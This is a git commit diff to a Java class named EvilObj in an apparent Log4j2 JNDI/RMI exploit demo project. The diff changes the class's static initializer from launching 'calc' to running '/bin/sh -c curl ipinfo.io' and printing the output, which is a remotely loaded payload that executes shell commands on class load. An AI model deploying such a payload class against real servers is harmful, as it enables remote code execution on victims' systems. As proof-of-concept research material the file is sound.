ab4d62732a06d22d1f7c6e503a8ec0275ccfcd6b
Leo <LeoWang@inslabs.org>
2021-12-11 14:03:15 +0800

    [feat] Shell Running

--- jmeta-rmi/src/main/java/com/upuphub/jmeta/rmi/log4j2141/haker/EvilObj.java
+++ jmeta-rmi/src/main/java/com/upuphub/jmeta/rmi/log4j2141/haker/EvilObj.java
@@ -1,14 +1,26 @@
 package com.upuphub.jmeta.rmi.log4j2141.haker;
 
-import java.io.IOException;
+import java.io.BufferedReader;
+import java.io.InputStreamReader;
+import java.io.SequenceInputStream;
 
-public class EvilObj{
-    static{
-        System.out.println("It's Me");
+public class EvilObj {
+    static {
         try {
-            Runtime.getRuntime().exec("calc");
-        } catch (IOException e) {
-            e.printStackTrace();
+            Process process = Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c", "curl ipinfo.io"});
+            process.waitFor();
+            SequenceInputStream sis = new SequenceInputStream(process.getInputStream(), process.getErrorStream());
+            BufferedReader br = new BufferedReader(new InputStreamReader(sis, "gbk"));
+            String line = null;
+            StringBuilder result = new StringBuilder();
+            while ((line = br.readLine()) != null) {
+                result.append(line).append("\r\n");
+            }
+            System.out.println(result.toString());
+            br.close();
+        } catch (Throwable ex) {
+
         }
+
     }
 }
